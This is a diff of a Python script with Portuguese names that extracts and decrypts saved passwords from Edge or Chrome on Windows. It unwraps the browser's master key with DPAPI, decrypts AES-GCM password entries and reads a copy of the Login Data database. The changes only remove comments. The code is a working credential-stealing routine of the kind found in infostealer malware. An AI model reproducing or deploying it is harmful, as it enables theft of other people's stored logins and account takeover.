@@ -31,21 +31,20 @@ def get_encryption_key(browser='Edge'):
         local_state = json.load(file)
 
     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    encrypted_key = encrypted_key[5:]  # Remove o "DPAPI" prefix
+    encrypted_key = encrypted_key[5:]
     key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     return key
 
 def descriptografar_senha(senha_encriptada, chave):
     try:
         if senha_encriptada.startswith(b'v10') or senha_encriptada.startswith(b'v11'):
-            senha_encriptada = senha_encriptada[3:]  # remove prefixo
+            senha_encriptada = senha_encriptada[3:]
             iv = senha_encriptada[:12]
-            payload = senha_encriptada[12:]  # dados + tag
+            payload = senha_encriptada[12:]
             aesgcm = AESGCM(chave)
-            senha = aesgcm.decrypt(iv, payload, None)  # AAD = None
+            senha = aesgcm.decrypt(iv, payload, None)
             return senha.decode()
         else:
-            # Versão antiga (sem AES-GCM)
             senha = win32crypt.CryptUnprotectData(senha_encriptada, None, None, None, 0)[1]
             return senha.decode()
     except Exception as e:
@@ -88,6 +87,5 @@ def extrair_logins(browser='Edge'):
         conn.close()
         os.remove(login_data_temp)
 
-# Chamada principal
 if __name__ == "__main__":
-    extrair_logins(browser='Edge')  # ou 'Chrome'
+    extrair_logins(browser='Edge')
